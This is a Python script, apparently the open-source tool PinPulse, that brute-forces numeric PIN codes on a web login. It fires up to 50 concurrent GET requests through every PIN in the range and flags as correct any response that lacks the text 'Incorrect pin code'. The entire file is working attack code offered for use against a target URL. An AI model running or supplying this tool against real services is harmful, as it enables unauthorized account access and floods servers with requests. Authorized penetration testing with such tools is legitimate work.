#!/usr/bin/env python3

# Author: fr0stb1rd
# https://github.com/fr0stb1rd/PinPulse
# SPDX-License-Identifier: MIT

import asyncio
import argparse
import sys
from aiohttp import ClientSession, ClientTimeout
from tqdm.asyncio import tqdm


DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

async def try_pin(session: ClientSession, url: str, pin_code: str, semaphore: asyncio.Semaphore) -> tuple[str, bool]:
    params = {'pin_code': pin_code}
    async with semaphore:
        try:
            timeout = ClientTimeout(total=10)
            async with session.get(url, params=params, headers=DEFAULT_HEADERS, timeout=timeout) as response:
                if response.status == 200:
                    text = await response.text()
                    if 'Incorrect pin code' not in text:
                        return pin_code, True
                return pin_code, False
        except Exception:
            return pin_code, False

async def find_pin(url, concurrent_requests, digits):
    pins = [str(i).zfill(digits) for i in range(10**digits)]
    
    semaphore = asyncio.Semaphore(concurrent_requests)
    found_event = asyncio.Event()
    found_pin = None

    async with ClientSession() as session:
        async def check_pin_wrapper(pin):
            nonlocal found_pin
            if found_event.is_set():
                return None

            result_pin, is_correct = await try_pin(session, url, pin, semaphore)

            if is_correct:
                found_pin = result_pin
                found_event.set()
                return result_pin
            return None

        tasks = [check_pin_wrapper(pin) for pin in pins]

        with tqdm(total=len(pins), desc="Testing PINs", unit="pin") as pbar:
            for coro in asyncio.as_completed(tasks):
                if found_event.is_set() and not tasks:
                    break
                
                result = await coro
                pbar.update(1)

                if result:
                    return result
        return None

def main():
    parser = argparse.ArgumentParser(description="Async PIN Brute Force Tool")
    
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com/login)")
    parser.add_argument("-c", "--concurrent", type=int, default=50, help="Number of concurrent requests (Default: 50)")
    parser.add_argument("-d", "--digits", type=int, default=4, help="Number of PIN digits (Default: 4)")
    
    args = parser.parse_args()

    print(f"[*] Starting PIN brute force...")
    print(f"[*] Target: {args.url}")
    print(f"[*] Concurrency: {args.concurrent}")
    print(f"[*] PIN Range: {'0'*args.digits} - {'9'*args.digits}")
    print("-" * 50)

    try:
        result = asyncio.run(find_pin(args.url, args.concurrent, args.digits))
        if result:
            print(f"\n[✓] SUCCESS: PIN FOUND -> {result}")
        else:
            print("\n[✗] FAILED: PIN NOT FOUND")
    except KeyboardInterrupt:
        print("\n[!] User interrupted the process.")
        sys.exit(1)

if __name__ == "__main__":
    main()